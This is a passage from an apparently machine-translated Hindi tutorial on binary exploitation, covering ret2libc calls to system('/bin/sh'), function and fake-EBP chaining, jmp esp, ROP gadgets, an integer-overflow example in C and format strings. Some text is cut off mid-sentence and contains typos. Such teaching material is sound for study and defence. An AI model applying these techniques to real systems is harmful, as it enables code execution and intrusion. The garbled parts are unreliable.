рдЗрд╕ рдкреНрд░рдХрд╛рд░ EIP рдХреЛ system рдХреЗ рдбрд╛рдпрд░реЗрдХреНрд╢рди рдХреЗ рд╕рд╛рде рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдЬреЛ тАЬ/bin/shтАЭ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЛ рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдЧрд╛ рдФрд░ рдЗрд╕рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ рдкрд░ exit() рдлрд╝рдВрдХреНрд╢рди рдПрдХреНрдЬреАрдХреНрдпреВрдЯ рд╣реЛрдЧрд╛ред

рдХрд┐рд╕реА рдлрд╝рдВрдХреНрд╢рди рдХреЗ рдХрд┐рд╕реА рдбрд╛рдпрд░реЗрдХреНрд╢рди рдХреЗ рдХрд┐рд╕реА рдмрд╛рдЗрдЯ рдореЗрдВ рдирд▓ рдпрд╛ рд╕реНрдкреЗрд╕ (\x20) рд╣реЛрдиреЗ рдХреА рд╕реНрдерд┐рддрд┐ рдореЗрдВ, рдЙрд╕ рдлрд╝рдВрдХреНрд╢рди рд╕реЗ рдкрд╣рд▓реЗ рдХреЗ рдбрд╛рдпрд░реЗрдХреНрд╢рдиреНрд╕ рдХреЛ рдбрд┐рд╕рд╛рд╕реЗрдВрдмрд▓ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рд╕рдВрднрд╡рддрдГ рдХрдИ NOPs рд╣реЛрдВрдЧреЗ рдЬреЛ рд╣рдореЗрдВ рдЙрд╕ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рд╕реАрдзреЗ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рдмрдЬрд╛рдп рдХрд┐рд╕реА рдЙрдирдореЗрдВ рд╕реЗ рдПрдХ рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдВрдЧреЗ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП > x/8i system-4 рдХреЗ рд╕рд╛рде)ред

рдпрд╣ рдореЗрдердб рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЬрдм рдХрд┐рд╕реА рдлрд╝рдВрдХреНрд╢рди рдЬреИрд╕реЗ рдХрд┐ system рдХреЛ opcode **ret** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **call** рдХреЗ рдмрдЬрд╛рдп рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдлрд╝рдВрдХреНрд╢рди рд╕рдордЭрддрд╛ рд╣реИ рдХрд┐ рдкрд╣рд▓реЗ 4рдмрд╛рдЗрдЯреНрд╕ EIP рдбрд╛рдпрд░реЗрдХреНрд╢рди рд╣реЛрдВрдЧреЗ рдЬрд┐рд╕ рдкрд░ рд╡рд╛рдкрд╕ рдЬрд╛рдирд╛ рд╣реИред

рдЗрд╕ рдореЗрдердб рдХреЗ рд╕рд╛рде рдПрдХ рджрд┐рд▓рдЪрд╕реНрдк рддрдХрдиреАрдХ **strncpy()** рдХреЛ рдХреЙрд▓ рдХрд░рдирд╛ рд╣реИ рддрд╛рдХрд┐ рд╕реНрдЯреИрдХ рд╕реЗ рд╣реАрдк рдореЗрдВ рдПрдХ рдкреЗрд▓реЛрдб рдХреЛ рдореВрд╡ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ рдФрд░ рдмрд╛рдж рдореЗрдВ **gets()** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрд╕ рдкреЗрд▓реЛрдб рдХреЛ рдПрдХреНрдЬреАрдХреНрдпреВрдЯ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред

рдПрдХ рдФрд░ рджрд┐рд▓рдЪрд╕реНрдк рддрдХрдиреАрдХ **mprotect()** рдХрд╛ рдЙрдкрдпреЛрдЧ рд╣реИ рдЬреЛ рдХрд┐рд╕реА рднреА рдореЗрдореЛрд░реА рдХреЗ рд╣рд┐рд╕реНрд╕реЗ рдХреЛ рд╡рд╛рдВрдЫрд┐рдд рдкрд░рдорд┐рд╢рдиреНрд╕ рдЕрд╕рд╛рдЗрди рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рдпрд╣ BDS, MacOS рдФрд░ OpenBSD рдореЗрдВ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ рдпрд╛ рдХрд░рддрд╛ рдерд╛, рд▓реЗрдХрд┐рди рд▓рд┐рдирдХреНрд╕ рдореЗрдВ рдирд╣реАрдВ (рдпрд╣ рдЪреЗрдХ рдХрд░рддрд╛ рд╣реИ рдХрд┐ рд▓рд┐рдЦрдиреЗ рдФрд░ рдПрдХреНрдЬреАрдХреНрдпреВрд╢рди рдХреА рдкрд░рдорд┐рд╢рдиреНрд╕ рдПрдХ рд╕рд╛рде рдирд╣реАрдВ рджреА рдЬрд╛ рд╕рдХрддреАрдВ)ред рдЗрд╕ рд╣рдорд▓реЗ рдХреЗ рд╕рд╛рде рд╕реНрдЯреИрдХ рдХреЛ рдлрд┐рд░ рд╕реЗ рдПрдХреНрдЬреАрдХреНрдпреВрдЯреЗрдмрд▓ рдХреЗ рд░реВрдк рдореЗрдВ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

**рдлрд╝рдВрдХреНрд╢рдиреНрд╕ рдХреА рдЪреЗрдирд┐рдВрдЧ**

рдкрд┐рдЫрд▓реА рддрдХрдиреАрдХ рдкрд░ рдЖрдзрд╛рд░рд┐рдд, рдпрд╣ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХрд╛ рддрд░реАрдХрд╛ рд╣реИ:\
рд░реЗрд▓реЗрдиреЛ + \&Funci├│n1 + \&pop;ret; + \&arg\_fun1 + \&Funci├│n2 + \&pop;ret; + \&arg\_fun2 + тАж

рдЗрд╕ рдкреНрд░рдХрд╛рд░ рд╕реЗ рдлрд╝рдВрдХреНрд╢рдиреНрд╕ рдХреА рдПрдХ рдЪреЗрди рдмрдирд╛рдИ рдЬрд╛ рд╕рдХрддреА рд╣реИ рдЬрд┐рдиреНрд╣реЗрдВ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдпрджрд┐ рдХрдИ рдЖрд░реНрдЧреНрдпреВрдореЗрдВрдЯреНрд╕ рд╡рд╛рд▓реЗ рдлрд╝рдВрдХреНрд╢рдиреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реЛ, рддреЛ рдЬрд░реВрд░реА рдЖрд░реНрдЧреНрдпреВрдореЗрдВрдЯреНрд╕ (рдЙрджрд╛. 4) рдбрд╛рд▓реЗ рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ 4 рдЖрд░реНрдЧреНрдпреВрдореЗрдВрдЯреНрд╕ рдбрд╛рд▓рдХрд░ рдРрд╕реЗ рдбрд╛рдпрд░реЗрдХреНрд╢рди рдХреЛ рдвреВрдБрдврд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ opcodes рд╣реЛрдВ: pop, pop, pop, pop, ret тАФ> **objdump -d ejecutable**

**EBPs рдХреА рдлрд╝реЙрд▓реНрд╕ рдЪреЗрдирд┐рдВрдЧ (EBPs рдХреА рдЪреЗрдирд┐рдВрдЧ)**

рдпрд╣ EBP рдХреЛ рдореИрдирд┐рдкреБрд▓реЗрдЯ рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рдХрд╛ рд▓рд╛рдн рдЙрдард╛рдХрд░ рдХрдИ рдлрд╝рдВрдХреНрд╢рдиреНрд╕ рдХреЗ рдПрдХреНрдЬреАрдХреНрдпреВрд╢рди рдХреЛ EBP рдФрд░ "leave;ret" рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЪреЗрди рдХрд░рдиреЗ рдореЗрдВ рд╣реЛрддрд╛ рд╣реИред

рд░реЗрд▓реЗрдиреЛ

* рд╣рдо EBP рдореЗрдВ рдПрдХ рдирдХрд▓реА EBP рд░рдЦрддреЗ рд╣реИрдВ рдЬреЛ рдЗрд╢рд╛рд░рд╛ рдХрд░рддрд╛ рд╣реИ: 2┬║ EBP\_falso + рдЬрд┐рд╕ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдПрдХреНрдЬреАрдХреНрдпреВрдЯ рдХрд░рдирд╛ рд╣реИ: (\&system() + \&leave;ret + &тАЬ/bin/shтАЭ)
* EIP рдореЗрдВ рд╣рдо рдПрдХ рдлрд╝рдВрдХреНрд╢рди рдХ
```
**Ret2PopRet**
```
рдпрджрд┐ рд╣рдорд╛рд░реЗ рдкрд╛рд╕ рдкрд╣рд▓реЗ рддрд░реНрдХ рдкрд░ рдирд┐рдпрдВрддреНрд░рдг рдирд╣реАрдВ рд╣реИ рд▓реЗрдХрд┐рди рджреВрд╕рд░реЗ рдпрд╛ рддреАрд╕рд░реЗ рдкрд░ рд╣реИ, рддреЛ рд╣рдо EIP рдХреЛ pop-ret рдпрд╛ pop-pop-ret рдХреЗ рдкрддреЗ рд╕реЗ рдЕрдзрд┐рд▓реЗрдЦрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреЛ рднреА рд╣рдореЗрдВ рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛред

**рдореБрд░рд╛рдд рддрдХрдиреАрдХ**

рд▓рд┐рдирдХреНрд╕ рдореЗрдВ рд╕рднреА рдкреНрд░реЛрдЧреНрд░рд╛рдо 0xbfffffff рд╕реЗ рд╢реБрд░реВ рд╣реЛрдХрд░ рдореИрдк рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред

рд▓рд┐рдирдХреНрд╕ рдореЗрдВ рдПрдХ рдирдИ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рд╕реНрдЯреИрдХ рдХрд╛ рдирд┐рд░реНрдорд╛рдг рдХреИрд╕реЗ рд╣реЛрддрд╛ рд╣реИ, рдЗрд╕реЗ рджреЗрдЦрддреЗ рд╣реБрдП рдПрдХ рдРрд╕реЗ рд╡рд╛рддрд╛рд╡рд░рдг рдореЗрдВ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рд╡рд┐рдХрд╕рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдПрдХрдорд╛рддреНрд░ рдЪрд░ shellcode рд╣реЛред рдЗрд╕рдХрд╛ рдкрддрд╛ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдЧрдгрдирд╛ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ: addr = 0xbfffffff - 4 - strlen(NOMBRE\_ejecutable\_completo) - strlen(shellcode)

рдЗрд╕ рддрд░рд╣ рд╕реЗ рдЖрд╕рд╛рдиреА рд╕реЗ рдЙрд╕ рд╡рд╛рддрд╛рд╡рд░рдг рдЪрд░ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ shellcode рд╣реИред

рдпрд╣ execle рдлрд╝рдВрдХреНрд╢рди рдХреА рдмрджреМрд▓рдд рд╕рдВрднрд╡ рд╣реИ рдЬреЛ рдХреЗрд╡рд▓ рдЙрдиреНрд╣реАрдВ рд╡рд╛рддрд╛рд╡рд░рдг рдЪрд░реЛрдВ рдХреЗ рд╕рд╛рде рдПрдХ рд╡рд╛рддрд╛рд╡рд░рдг рдмрдирд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдЬреЛ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВред

**ESP рдкрд░ рдЬрдореНрдк: рд╡рд┐рдВрдбреЛрдЬрд╝ рд╢реИрд▓реА**

рдЪреВрдВрдХрд┐ ESP рд╣рдореЗрд╢рд╛ рд╕реНрдЯреИрдХ рдХреА рд╢реБрд░реБрдЖрдд рдХреА рдУрд░ рдЗрд╢рд╛рд░рд╛ рдХрд░рддрд╛ рд╣реИ, рдЗрд╕ рддрдХрдиреАрдХ рдореЗрдВ EIP рдХреЛ **jmp esp** рдпрд╛ **call esp** рдХреЗ рдкрддреЗ рд╕реЗ рдмрджрд▓рдирд╛ рд╢рд╛рдорд┐рд▓ рд╣реИред рдЗрд╕ рддрд░рд╣, EIP рдХреЗ рдЕрдзрд┐рд▓реЗрдЦрди рдХреЗ рдмрд╛рдж shellcode рдХреЛ рд╕рдВрдЧреНрд░рд╣рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ **ret** рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж ESP рдЕрдЧрд▓реЗ рдкрддреЗ рдХреА рдУрд░ рдЗрд╢рд╛рд░рд╛ рдХрд░реЗрдЧрд╛, рдЬрд╣рд╛рдВ shellcode рд╕рдВрдЧреНрд░рд╣рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред

рдпрджрд┐ рд╡рд┐рдВрдбреЛрдЬрд╝ рдпрд╛ рд▓рд┐рдирдХреНрд╕ рдореЗрдВ ASLR рд╕рдХреНрд░рд┐рдп рдирд╣реАрдВ рд╣реИ, рддреЛ рдХрд┐рд╕реА рд╕рд╛рдЭрд╛ рдСрдмреНрдЬреЗрдХреНрдЯ рдореЗрдВ рд╕рдВрдЧреНрд░рд╣рд┐рдд **jmp esp** рдпрд╛ **call esp** рдХреЛ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрджрд┐ ASLR рд╕рдХреНрд░рд┐рдп рд╣реИ, рддреЛ рдЦреБрдж рд╡рд▓реНрдирд░реЗрдмрд▓ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреЗ рднреАрддрд░ рдЦреЛрдЬрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, EIP рдХреЗ рднреНрд░рд╖реНрдЯрд╛рдЪрд╛рд░ рдХреЗ рдмрд╛рдж shellcode рдХреЛ рд╕реНрдЯреИрдХ рдХреЗ рдмреАрдЪ рдореЗрдВ рдирд╣реАрдВ рдмрд▓реНрдХрд┐ рдЙрд╕рдХреЗ рдмрд╛рдж рд░рдЦрдиреЗ рдХреА рдХреНрд╖рдорддрд╛, рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддреА рд╣реИ рдХрд┐ рдлрд╝рдВрдХреНрд╢рди рдХреЗ рдмреАрдЪ рдореЗрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ push рдпрд╛ pop рдирд┐рд░реНрджреЗрд╢ shellcode рдХреЛ рдЫреВ рдирд╣реАрдВ рдкрд╛рдПрдВрдЧреЗ (рдЬреЛ рдХрд┐ рд╕реНрдЯреИрдХ рдХреЗ рдмреАрдЪ рдореЗрдВ рд░рдЦрдиреЗ рдкрд░ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ)ред

рдЗрд╕реА рддрд░рд╣ рд╕реЗ рдпрджрд┐ рд╣рдо рдЬрд╛рдирддреЗ рд╣реИрдВ рдХрд┐ рдХреЛрдИ рдлрд╝рдВрдХреНрд╢рди shellcode рдХреЗ рд╕рдВрдЧреНрд░рд╣рд┐рдд рдкрддреЗ рдХреЛ рд▓реМрдЯрд╛рддрд╛ рд╣реИ, рддреЛ **call eax** рдпрд╛ **jmp eax (ret2eax)** рдХреЛ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

**ROP (Return Oriented Programming) рдпрд╛ borrowed code chunks**

рдЬрд┐рди рдХреЛрдб рдЯреБрдХрдбрд╝реЛрдВ рдХреЛ рдмреБрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЙрдиреНрд╣реЗрдВ gadgets рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИред

рдпрд╣ рддрдХрдиреАрдХ **ret2libc** рддрдХрдиреАрдХ рдФрд░ **pop,ret** рдХреЗ рдЙрдкрдпреЛрдЧ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╡рд┐рднрд┐рдиреНрди рдлрд╝рдВрдХреНрд╢рди рдХреЙрд▓реНрд╕ рдХреЛ рдЬреЛрдбрд╝рдиреЗ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реИред

рдХреБрдЫ рдкреНрд░реЛрд╕реЗрд╕рд░ рдЖрд░реНрдХрд┐рдЯреЗрдХреНрдЪрд░ рдореЗрдВ рдкреНрд░рддреНрдпреЗрдХ рдирд┐рд░реНрджреЗрд╢ 32bits рдХрд╛ рдПрдХ рд╕реЗрдЯ рд╣реЛрддрд╛ рд╣реИ (MIPS рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП)ред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЗрдВрдЯреЗрд▓ рдореЗрдВ рдирд┐рд░реНрджреЗрд╢ рд╡рд┐рднрд┐рдиреНрди рдЖрдХрд╛рд░ рдХреЗ рд╣реЛрддреЗ рд╣реИрдВ рдФрд░ рдХрдИ рдирд┐рд░реНрджреЗрд╢ рдПрдХ рд╕реЗрдЯ рдмрд┐рдЯреНрд╕ рдХреЛ рд╕рд╛рдЭрд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП:

**movl $0xe4ff, -0x(%ebp)** тАФ> 0xffe4 рдмрд╛рдЗрдЯреНрд╕ рднреА рд╢рд╛рдорд┐рд▓ рд╣реИрдВ рдЬреЛ рдЗрд╕рдХрд╛ рдЕрдиреБрд╡рд╛рдж рдХрд░рддреЗ рд╣реИрдВ: **jmp \*%esp**

рдЗрд╕ рддрд░рд╣ рд╕реЗ рдХреБрдЫ рдирд┐рд░реНрджреЗрд╢реЛрдВ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдореВрд▓ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдореЗрдВ рднреА рдирд╣реАрдВ рд╣реЛрддреЗ рд╣реИрдВред

**ROPgadget.py** рд╣рдореЗрдВ рдмрд╛рдЗрдирд░реАрдЬрд╝ рдореЗрдВ рдорд╛рди рдЦреЛрдЬрдиреЗ рдореЗрдВ рдорджрдж рдХрд░рддрд╛ рд╣реИред

рдпрд╣ рдкреНрд░реЛрдЧреНрд░рд╛рдо **payloads** рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рднреА рдЙрдкрдпреЛрдЧреА рд╣реИред рдЖрдк рдЙрд╕реЗ рдЙрд╕ рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдХрд╛ рдирд╛рдо рджреЗ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕рд╕реЗ рдЖрдк ROPs рдирд┐рдХрд╛рд▓рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдФрд░ рдпрд╣ рдПрдХ рдкрд╛рдпрдерди payload рдЙрддреНрдкрдиреНрди рдХрд░реЗрдЧрд╛ рдЬрд┐рд╕реЗ рдЖрдк рдЙрд╕ рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдХреЗ рдкрддреЗ рдХреЗ рд╕рд╛рде рджреЗрддреЗ рд╣реИрдВ рдФрд░ payload рд╢реЗрд▓рдХреЛрдб рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХреЗ рд▓рд┐рдП рддреИрдпрд╛рд░ рд╣реЛрддрд╛ рд╣реИред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдЪреВрдВрдХрд┐ рдпрд╣ рд╕рд┐рд╕реНрдЯрдо рдХреЙрд▓реНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рдпрд╣ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рд╕реНрдЯреИрдХ рдкрд░ рдХреБрдЫ рднреА рдирд╣реАрдВ рдЪрд▓рд╛рддрд╛ рд╣реИ рдмрд▓реНрдХрд┐ рдХреЗрд╡рд▓ ROPs рдХреЗ рдкрддреЗ рд╕рдВрдЧреНрд░рд╣рд┐рдд рдХрд░рддрд╛ рд╣реИ рдЬреЛ **ret** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдВрдЧреЗред рдЗрд╕ payload рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ **ret** рдирд┐рд░реНрджреЗрд╢ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ payload рдХреЛ рдХреЙрд▓ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред

**Integer overflows**

рдпрд╣ рдкреНрд░рдХрд╛рд░ рдХреЗ overflows рддрдм рд╣реЛрддреЗ рд╣реИрдВ рдЬрдм рдХреЛрдИ рдЪрд░ рдЗрддрдиреА рдмрдбрд╝реА рд╕рдВрдЦреНрдпрд╛ рдХреЛ рд╕рд╣рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рддреИрдпрд╛рд░ рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИ рдЬрд┐рддрдиреА рдЙрд╕реЗ рджреА рдЬрд╛рддреА рд╣реИ, рд╕рдВрднрд╡рддрдГ рдЪрд┐рдиреНрд╣рд┐рдд рдФрд░ рдЕрдЪрд┐рдиреНрд╣рд┐рдд рдЪрд░реЛрдВ рдХреЗ рдмреАрдЪ рднреНрд░рдо рдХреЗ рдХрд╛рд░рдг, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП:
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
рдкрд┐рдЫрд▓реЗ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рд╣рдо рджреЗрдЦрддреЗ рд╣реИрдВ рдХрд┐ рдкреНрд░реЛрдЧреНрд░рд╛рдо 2 рдкреИрд░рд╛рдореАрдЯрд░реНрд╕ рдХреА рдЕрдкреЗрдХреНрд╖рд╛ рдХрд░рддрд╛ рд╣реИред рдкрд╣рд▓рд╛ рдкреИрд░рд╛рдореАрдЯрд░ рдЕрдЧрд▓реЗ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреА рд▓рдВрдмрд╛рдИ рд╣реИ рдФрд░ рджреВрд╕рд░рд╛ рд╕реНрдЯреНрд░рд┐рдВрдЧ рд╣реИред

рдпрджрд┐ рд╣рдо рдкрд╣рд▓реЗ рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рд░реВрдк рдореЗрдВ рдПрдХ рдирдХрд╛рд░рд╛рддреНрдордХ рд╕рдВрдЦреНрдпрд╛ рдкрд╛рд╕ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдпрд╣ рджрд┐рдЦрд╛рдИ рджреЗрдЧрд╛ рдХрд┐ len < 256 рд╣реИ рдФрд░ рд╣рдо рдЙрд╕ рдлрд┐рд▓реНрдЯрд░ рдХреЛ рдкрд╛рд░ рдХрд░ рдЬрд╛рдПрдВрдЧреЗ, рдФрд░ рд╕рд╛рде рд╣реА strlen(buffer) рднреА l рд╕реЗ рдХрдо рд╣реЛрдЧрд╛, рдХреНрдпреЛрдВрдХрд┐ l рдПрдХ unsigned int рд╣реИ рдФрд░ рдмрд╣реБрдд рдмрдбрд╝рд╛ рд╣реЛрдЧрд╛ред

рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреЗ overflows рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдХреБрдЫ рд▓рд┐рдЦрдирд╛ рдирд╣реАрдВ рд╣реИ, рдмрд▓реНрдХрд┐ рдЦрд░рд╛рдм рдбрд┐рдЬрд╛рдЗрди рдХрд┐рдП рдЧрдП рдлрд┐рд▓реНрдЯрд░реНрд╕ рдХреЛ рдкрд╛рд░ рдХрд░рдирд╛ рд╣реИ рддрд╛рдХрд┐ рдЕрдиреНрдп рд╕рдВрд╡реЗрджрдирд╢реАрд▓рддрд╛рдУрдВ рдХрд╛ рд╢реЛрд╖рдг рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред

**рдЕрдкреНрд░рд╛рд░рдВрднрд┐рдХ рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕**

рдПрдХ рдЕрдкреНрд░рд╛рд░рдВрднрд┐рдХ рд╡реЗрд░рд┐рдПрдмрд▓ рдХрд╛ рдореВрд▓реНрдп рдХреНрдпрд╛ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рдпрд╣ рдирд╣реАрдВ рдЬрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ рджреЗрдЦрдирд╛ рджрд┐рд▓рдЪрд╕реНрдк рд╣реЛ рд╕рдХрддрд╛ рд╣реИред рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдпрд╣ рдкрд┐рдЫрд▓реЗ рдлрдВрдХреНрд╢рди рдХреЗ рдПрдХ рд╡реЗрд░рд┐рдПрдмрд▓ рдХрд╛ рдореВрд▓реНрдп рд▓реЗ рд▓реЗ рдФрд░ рдпрд╣ рдЕрдЯреИрдХрд░ рджреНрд╡рд╛рд░рд╛ рдирд┐рдпрдВрддреНрд░рд┐рдд рд╣реЛред

## **Format Strings**

C рдореЗрдВ **`printf`** рдПрдХ рдлрдВрдХреНрд╢рди рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рд╕реА рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЛ **рдкреНрд░рд┐рдВрдЯ** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕ рдлрдВрдХреНрд╢рди рдХрд╛ **рдкрд╣рд▓рд╛ рдкреИрд░рд╛рдореАрдЯрд░** **рдХрдЪреНрдЪрд╛ рдкрд╛рда рдФрд░ рдлреЙрд░реНрдореЗрдЯрд░реНрд╕** рд╣реЛрддрд╛ рд╣реИред рдЗрд╕рдХреЗ рдмрд╛рдж рдХреЗ рдкреИрд░рд╛рдореАрдЯрд░реНрд╕ рд╡реЗ **рдореВрд▓реНрдп** рд╣реЛрддреЗ рд╣реИрдВ рдЬреЛ рдХрдЪреНрдЪреЗ рдкрд╛рда рд╕реЗ **рдлреЙрд░реНрдореЗрдЯрд░реНрд╕** рдХреА **рдЬрдЧрд╣ рд▓реЗрддреЗ рд╣реИрдВ**ред

рдЬрдм рдПрдХ **рдЕрдЯреИрдХрд░ рдХрд╛ рдЯреЗрдХреНрд╕реНрдЯ рдкрд╣рд▓реЗ рдЖрд░реНрдЧреБрдореЗрдВрдЯ** рдХреЗ рд░реВрдк рдореЗрдВ рдЗрд╕ рдлрдВрдХреНрд╢рди рдореЗрдВ рдбрд╛рд▓рд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ рд╕рдВрд╡реЗрджрдирд╢реАрд▓рддрд╛ рдкреНрд░рдХрдЯ рд╣реЛрддреА рд╣реИред рдЕрдЯреИрдХрд░ **printf рдлреЙрд░реНрдореЗрдЯ** рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреНрд╖рдорддрд╛рдУрдВ рдХрд╛ **рд╡рд┐рд╢реЗрд╖ рдЗрдирдкреБрдЯ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ** рдХрд┐рд╕реА рднреА рдбреЗрдЯрд╛ рдХреЛ рдХрд┐рд╕реА рднреА рдкрддреЗ рдкрд░ **рд▓рд┐рдЦрдиреЗ** рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдЧрд╛ред рдЗрд╕ рддрд░рд╣ рд╕реЗ **рдордирдорд╛рдиреЗ рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд** 